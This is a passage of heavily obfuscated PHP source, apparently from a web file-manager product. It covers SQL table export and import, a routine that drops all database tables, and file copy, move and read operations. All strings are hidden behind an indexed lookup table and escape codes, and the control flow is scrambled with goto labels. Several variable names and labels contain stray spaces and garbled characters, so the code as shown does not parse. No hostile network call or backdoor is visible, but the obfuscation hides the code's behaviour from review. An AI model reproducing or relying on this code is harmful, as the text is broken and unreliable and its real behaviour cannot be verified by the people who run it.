$d£…×Ø¦ã‘->field($f°¸ñÇ¢Åƒ)->order($a§ÖƒÌøŸš . $_SERVER[Î¿—”òá][974])->selectPage($dËğÎ¬µç¢, $a´«£•Ú´º); $f³Í—ºŸˆ’ = isset($dØ±˜ìÖˆ[$_SERVER[Î¿—”òá][351]][$_SERVER[Î¿—”òá][353]]) ? $dØ±˜ìÖˆ[$_SERVER[Î¿—”òá][351]][$_SERVER[Î¿—”òá][353]] : 0; $aÏĞ˜½å¾ó = !empty($dØ±˜ìÖˆ[$_SERVER[Î¿—”òá][354]]) ? $dØ±˜ìÖˆ[$_SERVER[Î¿—”òá][354]] : array(); if (!($AÚ³ƒµ¼¦ğ = count($aÏĞ˜½å¾ó))) { break; } $BºÆÌ¢ ç˜ = array(); foreach ($aÏĞ˜½å¾ó as $aïÛÅİË‚) { if ($eÇŒ”Àø½ == $_SERVER[Î¿—”òá][975] && $aïÛÅİË‚[$_SERVER[Î¿—”òá][29]] == $_SERVER[Î¿—”òá][976]) { $EÃÖåæØòÆ = json_decode($aïÛÅİË‚[$_SERVER[Î¿—”òá][359]], !0); if ($EÃÖåæØòÆ[$_SERVER[Î¿—”òá][28]] == date($_SERVER[Î¿—”òá][686]) && !$EÃÖåæØòÆ[$_SERVER[Î¿—”òá][685]]) { continue; } } if ($EŒï¬­Ìå´) { $aïÛÅİË‚[$_SERVER[Î¿—”òá][75]] = "\173\x69\157\x3a{$EŒï¬­Ìå´}\x7d" . substr($aïÛÅİË‚[$_SERVER[Î¿—”òá][75]], strlen("\x7b\x69\157\72{$aïÛÅİË‚[$_SERVER[Î¿—”òá][740]]}\175")); $aïÛÅİË‚[$_SERVER[Î¿—”òá][740]] = $EŒï¬­Ìå´; } $BºÆÌ¢ ç˜[] = $_SERVER[Î¿—”òá][977] . $this->sqlEncode($aïÛÅİË‚) . $_SERVER[Î¿—”òá][978]; } $D•Õ”†íà¼ = "\111\x4e\123\105\122\x54\40\111\x4e\124\x4f\x20\140{$eÇŒ”Àø½}\140\40\x28\x60" . implode($_SERVER[Î¿—”òá][979], $f°¸ñÇ¢Åƒ) . $_SERVER[Î¿—”òá][980]; fwrite($cÔËíÈ‹—á, $D•Õ”†íà¼ . implode($_SERVER[Î¿—”òá][981], $BºÆÌ¢ ç˜) . $_SERVER[Î¿—”òá][67] . PHP_EOL); $a´«£•Ú´º++; $DâÔ½Õ’Êœ += $AÚ³ƒµ¼¦ğ; if ($c‹Î»¬¿Œ) { $c‹Î»¬¿Œ->update($AÚ³ƒµ¼¦ğ); } } while ($a´«£•Ú´º <= $f³Í—ºŸˆ’); goto D‹Ó¢±à®³; dğôŞ¢’¥­: } public function sqlToDb($FìíÆ×Â, $e¦ñ‹õ”ß = null) { goto a “Ú®¬Ó£; aÆ»ÊîÌ‚™: $a‹‹»›Ÿ©· = 500 + 1; while (!feof($bôŒ×„îô)) { if ($e¦ñ‹õ”ß && $Eƒ„ë­‰¸« != 0) { $e¦ñ‹õ”ß->task[$FèŞ›å»Şğ[969]] += 1; } $Eƒ„ë­‰¸«++; $E¶ÂÓªÂˆ = trim(fgets($bôŒ×„îô)); $a¯ŞêŞ’‚É .= $FèŞ›å»Şğ[50] . $this->sqlDecode($E¶ÂÓªÂˆ, $this->type); if ($Eƒ„ë­‰¸« == $a‹‹»›Ÿ©·) { $a¯ŞêŞ’‚É = rtrim(trim($a¯ŞêŞ’‚É), $FèŞ›å»Şğ[67]); if (!$cóÜÛˆ•ª->execute($a¯ŞêŞ’‚É)) { return !1; } if ($e¦ñ‹õ”ß) { $e¦ñ‹õ”ß->update($Eƒ„ë­‰¸« - 1); } $a¯ŞêŞ’‚É = $FèŞ›å»Şğ[33]; $Eƒ„ë­‰¸« = 0; } } fclose($bôŒ×„îô); goto BÁ™·¼±±; BÁ™·¼±±: if (trim($a¯ŞêŞ’‚É)) { $a¯ŞêŞ’‚É = rtrim(trim($a¯ŞêŞ’‚É), $FèŞ›å»Şğ[67]); if (!$cóÜÛˆ•ª->execute($a¯ŞêŞ’‚É)) { return !1; } if ($e¦ñ‹õ”ß) { $e¦ñ‹õ”ß->update($Eƒ„ë­‰¸« - 1); } } return !0; goto aŠ°ˆ¼ÊŠ„; a “Ú®¬Ó£: $FèŞ›å»Şğ =& $_SERVER[Î¿—”òá]; $cóÜÛˆ•ª = $this->model()->db(); $bôŒ×„îô = @fopen($FìíÆ×Â, $FèŞ›å»Şğ[982]); goto Cé‘¶Á¤Õ; Cé‘¶Á¤Õ: if (!$bôŒ×„îô) { return !1; } $Eƒ„ë­‰¸« = 0; $a¯ŞêŞ’‚É = $FèŞ›å»Şğ[33]; goto aÆ»ÊîÌ‚™; aŠ°ˆ¼ÊŠ„: } public function dropTable($b²ñ×±æ™Ô = null) { $föĞáœÕÂ = $this->model()->db(); $aËÏ¼Ú‘»¿ = $b²ñ×±æ™Ô ? array($b²ñ×±æ™Ô) : $föĞáœÕÂ->getTables(); if (!$aËÏ¼Ú‘»¿) { return; } foreach ($aËÏ¼Ú‘»¿ as $b²ñ×±æ™Ô) { $föĞáœÕÂ->execute("\x64\x72\x6f\160\40\x74\x61\x62\154\145\x20\151\146\40\x65\x78\x69\x73\164\163\40\140{$b²ñ×±æ™Ô}\140"); } } private function taskToCache($dÂ‡çİ‰®Œ = null) { $a ª¨Šµ =& $_SERVER[Î¿—”òá]; if (!$dÂ‡çİ‰®Œ) { return; } $C†‰‘Ÿ¶© = array($a ª¨Šµ[971] => $dÂ‡çİ‰®Œ->task[$a ª¨Šµ[971]], $a ª¨Šµ[969] => $dÂ‡çİ‰®Œ->task[$a ª¨Šµ[969]], $a ª¨Šµ[983] => $dÂ‡çİ‰®Œ->task[$a ª¨Šµ[983]]); if ($C†‰‘Ÿ¶©[$a ª¨Šµ[969]] == $C†‰‘Ÿ¶©[$a ª¨Šµ[983]]) { $C†‰‘Ÿ¶©[$a ª¨Šµ[692]] = 1; } Cache::set($a ª¨Šµ[984] . $dÂ‡çİ‰®Œ->task[$a ª¨Šµ[367]], $C†‰‘Ÿ¶©); $dÂ‡çİ‰®Œ->end(); } private function sqlEncode($a´µÉªœ¿À) { $AªÆ¼‘Æ¿É =& $_SERVER[Î¿—”òá]; $EÉœµóÒ‚ = array(); foreach ($a´µÉªœ¿À as $E¹­‚ğŠÉè) { if (is_array($E¹­‚ğŠÉè)) { $E¹­‚ğŠÉè = json_encode_force($E¹­‚ğŠÉè); } $E¹­‚ğŠÉè = addslashes($E¹­‚ğŠÉè); $E¹­‚ğŠÉè = str_replace(array($AªÆ¼‘Æ¿É[985], $AªÆ¼‘Æ¿É[217]), array($AªÆ¼‘Æ¿É[986], $AªÆ¼‘Æ¿É[987]), $E¹­‚ğŠÉè); $EÉœµóÒ‚[] = str_replace($AªÆ¼‘Æ¿É[55], $AªÆ¼‘Æ¿É[988], $E¹­‚ğŠÉè); } return $AªÆ¼‘Æ¿É[55] . implode($AªÆ¼‘Æ¿É[989], $EÉœµóÒ‚) . $AªÆ¼‘Æ¿É[55]; } private function sqlDecode($fÁ½¬¯–, $CÅˆ•‚«…º) { $c¥ÎíÌÄ¶ =& $_SERVER[Î¿—”òá]; $fÁ½¬¯– = str_replace(array($c¥ÎíÌÄ¶[986], $c¥ÎíÌÄ¶[987]), array($c¥ÎíÌÄ¶[985], $c¥ÎíÌÄ¶[217]), $fÁ½¬¯–); if ($CÅˆ•‚«…º == $c¥ÎíÌÄ¶[9]) { $fÁ½¬¯– = stripslashes($fÁ½¬¯–); } return $fÁ½¬¯–; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Bë¤Ÿàª§‹, $D¼áÅ‹ßá) { $fÃÒâË²ÅÏ = self::driverMake($D¼áÅ‹ßá[0]); if (method_exists($fÃÒâË²ÅÏ, $Bë¤Ÿàª§‹)) { return @call_user_func_array(array($fÃÒâË²ÅÏ, $Bë¤Ÿàª§‹), $D¼áÅ‹ßá); } if (method_exists($fÃÒâË²ÅÏ, $_SERVER[Î¿—”òá][990])) { return @call_user_func_array(array($fÃÒâË²ÅÏ, $Bë¤Ÿàª§‹), $D¼áÅ‹ßá); } else { if (method_exists(self, $Bë¤Ÿàª§‹)) { return @call_user_func_array(array(self, $Bë¤Ÿàª§‹), $D¼áÅ‹ßá); } else { call_user_func_array(array(parent, $Bë¤Ÿàª§‹), $D¼áÅ‹ßá); } } } public static function init($cèª†÷îÃ) { return self::driverMake($cèª†÷îÃ); } public static function copy($aÉƒôŒ„Ë‰, $b¬Ñ–ßãäº, $BÎÔ¢šÕ‹  = false, $CÊ›¾Ÿîï‹ = false) { return self::copyMove($aÉƒôŒ„Ë‰, $b¬Ñ–ßãäº, $BÎÔ¢šÕ‹ , $_SERVER[Î¿—”òá][490], $CÊ›¾Ÿîï‹); } public static function move($E¾ÀÏ”†¨ö, $cŠ•ñ¹ƒëÂ, $cåöŒ¼É—¡ = false, $Aöéô°ò®Ø = false) { return self::copyMove($E¾ÀÏ”†¨ö, $cŠ•ñ¹ƒëÂ, $cåöŒ¼É—¡, $_SERVER[Î¿—”òá][492], $Aöéô°ò®Ø); } public static function saveFile($Dô‹Ãë½š, $eôğ‹äš¾, $f¾ƒí“Ä‹· = true) { goto A¸æÒÒá¥•; F¹ôÉòÀ÷: $B°«¦Õ’óÁ = self::driverMake($eôğ‹äš¾); $f„³ÀÏæ = !1; if ($B°«¦Õ’óÁ->pathParse[$E® ó¦èÚÆ[991]]) { $Eõà™Ö©†ƒ = $B°«¦Õ’óÁ->pathParse[$E® ó¦èÚÆ[991]]; $f„³ÀÏæ = $B°«¦Õ’óÁ; $B°«¦Õ’óÁ = self::driverMake($Eõà™Ö©†ƒ); } goto Eïèôì˜¡Ø; Eïèôì˜¡Ø: $b˜Ğ—ÂÅõ˜ = $B°«¦Õ’óÁ->pathFather($eôğ‹äš¾); $AÏí¸°–Œ = !0; if (!$f¾ƒí“Ä‹· && self::driverIsSame($dó…Ô†÷äé, $B°«¦Õ’óÁ)) { $AÏí¸°–Œ = !1; } goto a•ß±Ö»¸; A¸æÒÒá¥•: $E® ó¦èÚÆ =& $_SERVER[Î¿—”òá]; $aŞß™áö†œ = self::info($eôğ‹äš¾); $dó…Ô†÷äé = self::driverMake($Dô‹Ãë½š); goto F¹ôÉòÀ÷; a•ß±Ö»¸: $d×ó‹îº« = self::copyFile($dó…Ô†÷äé, $Dô‹Ãë½š, $B°«¦Õ’óÁ, $b˜Ğ—ÂÅõ˜, $aŞß™áö†œ[$E® ó¦èÚÆ[28]], $AÏí¸°–Œ); if ($f„³ÀÏæ) { $d×ó‹îº« = $f„³ÀÏæ->getPathOuter($d×ó‹îº«); } return $d×ó‹îº«; goto DÈÀÃÛ›ì§; DÈÀÃÛ›ì§: } private static function copyMove($F‘×¤²ÓĞè, $Fß»êî®ç”, $A¥·Ê—ä”‡, $fø×î•ë©°, $e¶˜Ê©‚¢ = false) { goto AÇ˜ †Ú†ƒ; a¡‰œ¿ËÍ: $f¥é¶Òœì = !1; if ($BÍù‹šË Û->pathParse[$F¹ğ£†‰í¶[991]]) { $Fß»êî®ç” = $BÍù‹šË Û->pathParse[$F¹ğ£†‰í¶[991]]; $f¥é¶Òœì = $BÍù‹šË Û; $BÍù‹šË Û = self::driverMake($Fß»êî®ç”); } self::check($D«à„÷¾‡ò, $F‘×¤²ÓĞè, $BÍù‹šË Û, $Fß»êî®ç”); goto f÷’ÔİË˜; c˜•–®êø¨: if ($f¥é¶Òœì) { $C¹©ÄÒ‰×Ó = $f¥é¶Òœì->getPathOuter($C¹©ÄÒ‰×Ó); } return $C¹©ÄÒ‰×Ó; goto B¶¯ìåâ¥; a¥ÀÁù»Â–: $C£Íƒî›ãŠ = $D«à„÷¾‡ò->isFile($F‘×¤²ÓĞè); if (!$C£Íƒî›ãŠ && $BÍù‹šË Û->getType() == $F¹ğ£†‰í¶[690] && $D«à„÷¾‡ò->getType() == $F¹ğ£†‰í¶[102]) { $C¹©ÄÒ‰×Ó = $BÍù‹šË Û->copyFolderFromIO($D«à„÷¾‡ò, $F‘×¤²ÓĞè, $Fß»êî®ç”, $A¥·Ê—ä”‡, $fØŸÉÅã ‘, $e¶˜Ê©‚¢); } else { $C¹©ÄÒ‰×Ó = self::copyPath($D«à„÷¾‡ò, $F‘×¤²ÓĞè, $BÍù‹šË Û, $Fß»êî®ç”, $A¥·Ê—ä”‡, $fØŸÉÅã ‘, $C£Íƒî›ãŠ, $e¶˜Ê©‚¢); } if ($C¹©ÄÒ‰×Ó && $fØŸÉÅã ‘) { $D«à„÷¾‡ò->remove($F‘×¤²ÓĞè); } goto c˜•–®êø¨; AÇ˜ †Ú†ƒ: $F¹ğ£†‰í¶ =& $_SERVER[Î¿—”òá]; if (!$F‘×¤²ÓĞè || $F‘×¤²ÓĞè == $F¹ğ£†‰í¶[8] || !$Fß»êî®ç”) { return !1; } ignore_timeout(); goto B›’–’Úî; B›’–’Úî: $D«à„÷¾‡ò = self::driverMake($F‘×¤²ÓĞè); $BÍù‹šË Û = self::driverMake($Fß»êî®ç”); $fØŸÉÅã ‘ = $fø×î•ë©° == $F¹ğ£†‰í¶[492]; goto a¡‰œ¿ËÍ; f÷’ÔİË˜: Hook::trigger($F¹ğ£†‰í¶[72], $D«à„÷¾‡ò, $F‘×¤²ÓĞè, $BÍù‹šË Û, $Fß»êî®ç”); $EŒå‡£ç²é = self::driverIsSame($D«à„÷¾‡ò, $BÍù‹šË Û); if ($EŒå‡£ç²é) { if ($fø×î•ë©° == $F¹ğ£†‰í¶[492] && !method_exists($BÍù‹šË Û, $F¹ğ£†‰í¶[992]) && trim($Fß»êî®ç”, $F¹ğ£†‰í¶[8]) == trim($BÍù‹šË Û->pathFather($F‘×¤²ÓĞè), $F¹ğ£†‰í¶[8])) { return $BÍù‹šË Û->getPathOuter($F‘×¤²ÓĞè); } if (method_exists($BÍù‹šË Û, $fø×î•ë©°)) { return $BÍù‹šË Û->{$fø×î•ë©°}($F‘×¤²ÓĞè, $Fß»êî®ç”, $A¥·Ê—ä”‡); } } goto a¥ÀÁù»Â–; B¶¯ìåâ¥: } private static function check($a†Âˆ„¥ë‚, $d¬¼ÌÎÃœ, $CÖÉÜ„Åª–, &$bÕù©ÑªÚè) { $a’‹á…  =& $_SERVER[Î¿—”òá]; if (self::driverIsSame($a†Âˆ„¥ë‚, $CÖÉÜ„Åª–) && $a†Âˆ„¥ë‚->isFolder($d¬¼ÌÎÃœ) && $a†Âˆ„¥ë‚->isParentOf($d¬¼ÌÎÃœ, $bÕù©ÑªÚè)) { show_json(LNG($a’‹á… [993]), !1); } if (!$a†Âˆ„¥ë‚->exist($d¬¼ÌÎÃœ)) { show_json(LNG($a’‹á… [101]), !1); } } private static function copyPath($B”Ğš°‹, $cÔ‹˜ÛòÔ¨, $aà‚ÄÌ¾¸, $Eç‘˜À˜æ°, $fóôÔÑëöÓ, $d’µ­ÛÚÍÑ, $Bœí×™è†İ, $A¼‡„ÆÈ¥ = false) { goto eóÖ§­µ‘Î; c¥ËÍõÔê: if ($Bœí×™è†İ) { return self::copyFile($B”Ğš°‹, $cÔ‹˜ÛòÔ¨, $aà‚ÄÌ¾¸, $Eç‘˜À˜æ°, $B†„Å¶Âñ±, $d’µ­ÛÚÍÑ); } if ($fóôÔÑëöÓ == REPEAT_RENAME_FOLDER) { $fóôÔÑëöÓ = !1; } $E¨Ü¾Ø… = rtrim($Eç‘˜À˜æ°, $cİæ°íÖË[8]) . $cİæ°íÖË[8] . $B†„Å¶Âñ±; goto cİñº‚’â; eóÖ§­µ‘Î: $cİæ°íÖË =& $_SERVER[Î¿—”òá]; $B†„Å¶Âñ± = $A¼‡„ÆÈ¥ ? $A¼‡„ÆÈ¥ : $B”Ğš°‹->getPathName($B”Ğš°‹->pathThis($cÔ‹˜ÛòÔ¨)); if ($fóôÔÑëöÓ) { $AŠÍ»¶ˆŠ¥ = $aà‚ÄÌ¾¸->fileNameExist($Eç‘˜À˜æ°, $B†„Å¶Âñ±); $B†„Å¶Âñ± = $aà‚ÄÌ¾¸->fileNameAuto($Eç‘˜À˜æ°, $B†„Å¶Âñ±, $fóôÔÑëöÓ, !$Bœí×™è†İ); $fóôÔÑëöÓ = $AŠÍ»¶ˆŠ¥ ? $fóôÔÑëöÓ : !1; } goto c¥ËÍõÔê; eºÓ’†ë¦: $A’íê“ÔÎ = array_merge($a™°èˆš–‘[$cİæ°íÖË[73]], $a™°èˆš–‘[$cİæ°íÖË[74]]); foreach ($A’íê“ÔÎ as $ešØìÀöŒË) { $a¡î¼Ã­¦Ã = $ešØìÀöŒË[$cİæ°íÖË[29]] == $cİæ°íÖË[167]; $cÔ‹˜ÛòÔ¨ = $B”Ğš°‹->getPathInner($ešØìÀöŒË[$cİæ°íÖË[75]]); $A¸ ª’Ó³¤ = self::copyPath($B”Ğš°‹, $cÔ‹˜ÛòÔ¨, $aà‚ÄÌ¾¸, $Eç‘˜À˜æ°, $fóôÔÑëöÓ, $d’µ­ÛÚÍÑ, $a¡î¼Ã­¦Ã); if (!$A¸ ª’Ó³¤) { write_log($cİæ°íÖË[994] . $cÔ‹˜ÛòÔ¨ . $cİæ°íÖË[995] . $Eç‘˜À˜æ°, $cİæ°íÖË[996]); } } return $DˆñÈÍÎšë; goto e„»Š±‹ß; cİñº‚’â: $DˆñÈÍÎšë = $aà‚ÄÌ¾¸->mkdir($aà‚ÄÌ¾¸->getPath($E¨Ü¾Ø…)); $Eç‘˜À˜æ° = $aà‚ÄÌ¾¸->getPathInner($DˆñÈÍÎšë); $a™°èˆš–‘ = $B”Ğš°‹->listPath($cÔ‹˜ÛòÔ¨, !0); goto eºÓ’†ë¦; e„»Š±‹ß: } private static function copyFile($E”Ä—­ì¼, $dÏ¯ë©ÑÉ, $fë…éÓÀ³‡, $cŒß¨“Ì‡, $E÷ æ¾‚õ—, $aÑ†„Ñİä‘) { goto a¾’à¢ÏÆ; CÀ‘¢ó¢‡Û: Hook::trigger($BÀç‰ºº¦Ä[998], $E”Ä—­ì¼, $dÏ¯ë©ÑÉ, $fë…éÓÀ³‡, $cŒß¨“Ì‡, $E÷ æ¾‚õ—, $CÄ‰¯˜š£); if (self::driverIsSame($E”Ä—­ì¼, $fë…éÓÀ³‡)) { if ($aÑ†„Ñİä‘) { $fèŸ·Ä¨®‹ = $fë…éÓÀ³‡->moveFile($dÏ¯ë©ÑÉ, $cŒß¨“Ì‡); } else { $fèŸ·Ä¨®‹ = $fë…éÓÀ³‡->copyFile($dÏ¯ë©ÑÉ, $cŒß¨“Ì‡); } Hook::trigger($BÀç‰ºº¦Ä[999], $E”Ä—­ì¼, $dÏ¯ë©ÑÉ, $fë…éÓÀ³‡, $cŒß¨“Ì‡, $E÷ æ¾‚õ—, $fèŸ·Ä¨®‹); return $fèŸ·Ä¨®‹; } $D¤¹ê¶Ö‰™ = TEMP_FILES; goto bØÄ½âĞÛæ; a¾’à¢ÏÆ: $BÀç‰ºº¦Ä =& $_SERVER[Î¿—”òá]; $cŒß¨“Ì‡ = $fë…éÓÀ³‡->getPath(rtrim($cŒß¨“Ì‡, $BÀç‰ºº¦Ä[8]) . $BÀç‰ºº¦Ä[8] . $E÷ æ¾‚õ—); $CÄ‰¯˜š£ = $BÀç‰ºº¦Ä[997] . time() . rand_string(5); goto CÀ‘¢ó¢‡Û; bØÄ½âĞÛæ: mk_dir($D¤¹ê¶Ö‰™); $bÄçöâô¤Ñ = $D¤¹ê¶Ö‰™ . $CÄ‰¯˜š£; $bÄçöâô¤Ñ = $E”Ä—­ì¼->download($dÏ¯ë©ÑÉ, $bÄçöâô¤Ñ); goto cò‘äöŒÊÉ; cò‘äöŒÊÉ: $bÄçöâô¤Ñ = $E”Ä—­ì¼->iconvApp($bÄçöâô¤Ñ); $fèŸ·Ä¨®‹ = $fë…éÓÀ³‡->upload($cŒß¨“Ì‡, $bÄçöâô¤Ñ, $aÑ†„Ñİä‘); self::remove($D¤¹ê¶Ö‰™ . $CÄ‰¯˜š£); goto D£Û¸Ôğ±; D£Û¸Ôğ±: Hook::trigger($BÀç‰ºº¦Ä[999], $E”Ä—­ì¼, $dÏ¯ë©ÑÉ, $fë…éÓÀ³‡, $cŒß¨“Ì‡, $E÷ æ¾‚õ—, $fèŸ·Ä¨®‹); return $fèŸ·Ä¨®‹; goto Bøê°³Íˆ; Bøê°³Íˆ: } public static function pathFather($fšß°Ú°Ú) { $dÄ­×¡­ = IO::init($fšß°Ú°Ú); $aÂƒæÂ ŠÆ = $dÄ­×¡­->pathFather($dÄ­×¡­->path); return $dÄ­×¡­->getPathOuter($aÂƒæÂ ŠÆ); } public static function fileOut($D‹ã‚ŸÌË‘, $AöÎ—Úœäƒ = false, $aÇ¦£½ÙÊß = false, $cÍ×ˆÃŒÏ— = '') { $C„³åà¿êì = self::driverMake($D‹ã‚ŸÌË‘); if ($C„³åà¿êì->isFileOutServer()) { return $C„³åà¿êì->fileOutServer($D‹ã‚ŸÌË‘, $AöÎ—Úœäƒ, $aÇ¦£½ÙÊß, $cÍ×ˆÃŒÏ—); } return $C„³åà¿êì->fileOut($D‹ã‚ŸÌË‘, $AöÎ—Úœäƒ, $aÇ¦£½ÙÊß, $cÍ×ˆÃŒÏ—); } public static function fileOutImage($Fæ÷´ÔŒ¸á, $b£Ñ¯Ü¤Ä = 250) { $B¬¨‹öî = array(250, 600, 1200, 3000); for ($E’ËÊ£Š÷è = 0; $E’ËÊ£Š÷è < count($B¬¨‹öî); $E’ËÊ£Š÷è++) { if ($E’ËÊ£Š÷è == 0 && $b£Ñ¯Ü¤Ä <= $B¬¨‹öî[$E’ËÊ£Š÷è]) { $b£Ñ¯Ü¤Ä = $B¬¨‹öî[$E’ËÊ£Š÷è]; break; } else { if ($b£Ñ¯Ü¤Ä > $B¬¨‹öî[$E’ËÊ£Š÷è - 1] && $b£Ñ¯Ü¤Ä <= $B¬¨‹öî[$E’ËÊ£Š÷è]) { $b£Ñ¯Ü¤Ä = $B¬¨‹öî[$E’ËÊ£Š÷è]; break; } else { if ($E’ËÊ£Š÷è == count($B¬¨‹öî) - 1 && $b£Ñ¯Ü¤Ä > $B¬¨‹öî[$E’ËÊ£Š÷è]) { $b£Ñ¯Ü¤Ä = $B¬¨‹öî[$E’ËÊ£Š÷è]; break; } } } } $EáÄø‘‚êÆ = self::driverMake($Fæ÷´ÔŒ¸á); if ($EáÄø‘‚êÆ->isFileOutServer()) { return $EáÄø‘‚êÆ->fileOutImageServer($Fæ÷´ÔŒ¸á, $b£Ñ¯Ü¤Ä); } return $EáÄø‘‚êÆ->fileOutImage($Fæ÷´ÔŒ¸á, $b£Ñ¯Ü¤Ä); } private static function driverIsSame($dÂÃë…Ùğ, $e…ñÑ²‚˜) { goto aŠùŒ¡”«; aÁöËµğéÏ: if ($dÂÃë…Ùğ->pathDriver == $e…ñÑ²‚˜->pathDriver) { return !0; } return !1; goto F­Š÷‰”‰; c¥±†¸ìùÌ: if ($DÑœÑëÊ¬ != $DãŠ‘”±å) { return !1; } if ($DÑœÑëÊ¬ == $e¾É¿ŠÍªÃ[690]) { return !0; } if ($DÑœÑëÊ¬ == $e¾É¿ŠÍªÃ[102]) { return !0; } goto aÁöËµğéÏ; aŠùŒ¡”«: $e¾É¿ŠÍªÃ =& $_SERVER[Î¿—”òá]; $DÑœÑëÊ¬ = $dÂÃë…Ùğ->getType(); $DãŠ‘”±å = $e…ñÑ²‚˜->getType(); goto c¥±†¸ìùÌ; F­Š÷‰”‰: } public static function copyUpdate($D‘ï˜Èæ‚©, $c“ä®äƒƒ–) { goto C¶ªÉÄÒğ¿; DÃ“ÔÎÓÒ³: Hook::trigger($A‹ºç©£‚[1003], $D‘ï˜Èæ‚©, $c“ä®äƒƒ–, $D‡£óœÂ‘­); foreach ($a‚†Š‰Î¨ as $DñœÒÍæ¢…) { IO::mkdir($DñœÒÍæ¢…); } foreach ($Fí¦»Î¿Ô™ as $DñœÒÍæ¢…) { IO::copy($DñœÒÍæ¢…[$A‹ºç©£‚[1000]], $DñœÒÍæ¢…[$A‹ºç©£‚[1001]], REPEAT_REPLACE); } goto d×ºéàõ¾¼; C¶ªÉÄÒğ¿: $A‹ºç©£‚ =& $_SERVER[Î¿—”òá]; if (!IO::exist($D‘ï˜Èæ‚©)) { return !1; } if (!IO::exist($c“ä®äƒƒ–)) { IO::mkdir($c“ä®äƒƒ–); } goto b—¨È·¢Ä; eÕÈ¦†’äÕ: $a‚†Š‰Î¨ = array(); foreach ($dĞßÙƒì—¹ as $EÈßˆ¿ÅŸØ => $DñœÒÍæ¢…) { if (isset($CÉ—µÕÀ¢¶[$EÈßˆ¿ÅŸØ])) { if ($DñœÒÍæ¢…[$A‹ºç©£‚[76]] == 1) { continue; } if ($CÉ—µÕÀ¢¶[$EÈßˆ¿ÅŸØ][$A‹ºç©£‚[77]] == $DñœÒÍæ¢…[$A‹ºç©£‚[77]]) { continue; } } if ($DñœÒÍæ¢…[$A‹ºç©£‚[76]] == 1) { $a‚†Š‰Î¨[] = $c“ä®äƒƒ– . $A‹ºç©£‚[8] . $EÈßˆ¿ÅŸØ; continue; } $Dä†İ† ÆŸ = strstr(trim($EÈßˆ¿ÅŸØ, $A‹ºç©£‚[8]), $A‹ºç©£‚[8]) ? get_path_father($EÈßˆ¿ÅŸØ) : $A‹ºç©£‚[33]; $Fí¦»Î¿Ô™[] = array($A‹ºç©£‚[1000] => $DñœÒÍæ¢…[$A‹ºç©£‚[75]], $A‹ºç©£‚[1001] => rtrim($c“ä®äƒƒ–, $A‹ºç©£‚[8]) . $A‹ºç©£‚[8] . $Dä†İ† ÆŸ, $A‹ºç©£‚[1002] => $DñœÒÍæ¢…); } $D‡£óœÂ‘­ = array($A‹ºç©£‚[167] => $Fí¦»Î¿Ô™, $A‹ºç©£‚[76] => $a‚†Š‰Î¨); goto DÃ“ÔÎÓÒ³; b—¨È·¢Ä: $dĞßÙƒì—¹ = self::_listAll($D‘ï˜Èæ‚©); $CÉ—µÕÀ¢¶ = self::_listAll($c“ä®äƒƒ–); $Fí¦»Î¿Ô™ = array(); goto eÕÈ¦†’äÕ; d×ºéàõ¾¼: } private static function _listAll($a—ñÇîë°¿) { $B—ÆåİÑÖ =& $_SERVER[Î¿—”òá]; $a—ñÇîë°¿ = KodIO::clear($a—ñÇîë°¿); $bïõÕÓÕÛº = IO::listAll($a—ñÇîë°¿); foreach ($bïõÕÓÕÛº as &$B™¨°Š™êÄ) { $FÍâ›ô×“Â = substr($B™¨°Š™êÄ[$B—ÆåİÑÖ[75]], strlen($a—ñÇîë°¿)); $B™¨°Š™êÄ[$B—ÆåİÑÖ[1004]] = trim($FÍâ›ô×“Â, $B—ÆåİÑÖ[8]); } return array_to_keyvalue($bïõÕÓÕÛº, $B—ÆåİÑÖ[1004]); } public static function fileSubstr($AÓñÑ‡ô¯°, $dÏ¤ëÚ‡á¦, $B‡˜Ë áİÇ = false) { goto aï’åé¶’ï; aï’åé¶’ï: $D°ÑÆß‹ôî = self::driverMake($AÓñÑ‡ô¯°); $fõ¶ßì©âŠ = $D°ÑÆß‹ôî->size($AÓñÑ‡ô¯°); $fÍãÁÈŒïÑ = $dÏ¤ëÚ‡á¦; goto EŸ†øìÆ»´; EŸ†øìÆ»´: $a‚”ô¦İÏ­ = $B‡˜Ë áİÇ; if ($dÏ¤ëÚ‡á¦ < 0) { $dÏ¤ëÚ‡á¦ = $fõ¶ßì©âŠ + $dÏ¤ëÚ‡á¦; } if ($B‡˜Ë áİÇ === !1) { $B‡˜Ë áİÇ = $fõ¶ßì©âŠ - $dÏ¤ëÚ‡á¦; } goto E¾Ã·ø„‘; c§ÀÂì¢í: return $D°ÑÆß‹ôî->fileSubstr($AÓñÑ‡ô¯°, $dÏ¤ëÚ‡á¦, $B‡˜Ë áİÇ); goto C¶÷†ÅÄ…Û; E¾Ã·ø„‘: if ($dÏ¤ëÚ‡á¦ + $B‡˜Ë áİÇ > $fõ¶ßì©âŠ) { $B‡˜Ë áİÇ = $fõ¶ßì©âŠ - $dÏ¤ëÚ‡á¦; } if ($B‡˜Ë áİÇ <= 0) { return $_SERVER[Î¿—”òá][33]; } if ($dÏ¤ëÚ‡á¦ < 0 || $dÏ¤ëÚ‡á¦ >= $fõ¶ßì©âŠ || $B‡˜Ë áİÇ > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\145\122\145\x61\144\40\x65\x72\x72\x6f\x72\41\x20\163\x74\141\x72\x74\x3d{$dÏ¤ëÚ‡á¦}\73\x6c\145\x6e\147\164\150\x3d{$B‡˜Ë áİÇ}\x3b\40\163\151\x7a\x65\75{$fõ¶ßì©âŠ}\x3b"); } goto c§ÀÂì¢í; C¶÷†ÅÄ…Û: } private static function driverMake(&$d¦½ôô›æ¢) { goto f–¡ß©Ò†ç; f–¡ß©Ò†ç: $c™ëÄ¼Ÿª =& $_SERVER[Î¿—”òá]; $C“ø¼İË›¶ = KodIO::parse($d¦½ôô›æ¢); if (!self::$driverListSystem) { $E—Áœ­Ñ«Œ = Model($c™ëÄ¼Ÿª[700])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($E—Áœ­Ñ«Œ, $c™ëÄ¼Ÿª[367]); } goto Fö›à¶ø‘š; aÅ¼™»¾ä: return $a§½†ª„÷Â; goto b´ì–×áé; Fö›à¶ø‘š: if ($C“ø¼İË›¶[$c™ëÄ¼Ÿª[29]] == KodIO::KOD_IO && !self::$driverListSystem[$C“ø¼İË›¶[$c™ëÄ¼Ÿª[367]]]) { return !1; } $d¦½ôô›æ¢ = $C“ø¼İË›¶[$c™ëÄ¼Ÿª[1005]]; $a§½†ª„÷Â = self::driverGet($C“ø¼İË›¶, $d¦½ôô›æ¢); goto 